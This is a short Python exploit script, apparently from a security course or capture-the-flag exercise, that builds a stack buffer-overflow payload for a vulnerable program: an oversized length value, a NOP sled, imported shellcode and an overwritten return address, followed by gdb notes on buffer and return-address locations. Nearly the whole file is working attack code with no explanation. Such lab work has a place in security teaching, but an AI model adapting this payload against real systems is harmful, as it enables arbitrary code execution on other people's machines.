from shellcode import shellcode
from struct import pack 
import sys

def main():
    sys.stdout.buffer.write(pack("<I",0x40000025))
    for i in range(100):
        sys.stdout.buffer.write(b"\x90")
    sys.stdout.buffer.write(shellcode)              #size 48bytes
    for i in range(65):
        sys.stdout.buffer.write(b"\x90")
    sys.stdout.buffer.write(pack("<I",0xfffe8b20))  #addr to jump to my shell code
    sys.stdout.buffer.write(pack("<I",0x05))        #specify end of file

   
if __name__ == "__main__":
    main()

# alloca functions returns a pointer to the beginning of 
# the allocated space. If the allocation causes stack stack
#program behaviour is undefined

#seg fault  at 0x08049e4e

#second args
#when the input is 1048575
    #buffer starts @0xffbef970
    #buffer ends @0xffcef978

#return addr for read file
#0xfffef9cc

#return addr for read elements
#0xfffef9a8
#p/d 0xbfffef9cc - 0xbfffef8e0

#break point
#break *0x08049da5
#break * 0x08049ea6

 #x/32wx 0xfffef9c0

#actual return address is at 0xfffef9ac